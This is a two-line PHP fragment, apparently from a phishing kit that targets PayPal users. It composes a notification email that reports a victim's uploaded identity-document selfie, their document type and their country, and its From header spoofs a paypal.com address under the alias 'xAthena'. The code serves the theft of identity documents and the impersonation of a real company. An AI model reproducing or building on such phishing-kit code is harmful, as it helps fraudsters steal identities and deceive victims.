...
$subject="-".$scamname."- PAYPAL SELFIE OF [".$_SESSION['doc_type']."] From >> [".$_SESSION['ip_countryName']."]";
$headers="From: xAthena <newselfie@paypal.com>\r\n";
